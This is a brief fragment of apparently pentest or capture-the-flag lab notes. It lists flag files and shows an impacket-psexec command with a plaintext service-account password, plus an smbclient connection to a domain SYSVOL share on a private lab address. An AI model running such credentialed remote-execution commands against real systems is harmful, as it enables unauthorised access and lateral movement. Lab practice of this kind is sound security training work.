...
flag 2 txt and flag 3 txt and flag 4 txt and flag 5 txt
...
└─$ impacket-psexec 'PENTESTLAB/svc_backup:Password123!@192.168.56.20'

└─$ smbclient //192.168.56.20/SYSVOL -U "PENTESTLAB\bh_intern"
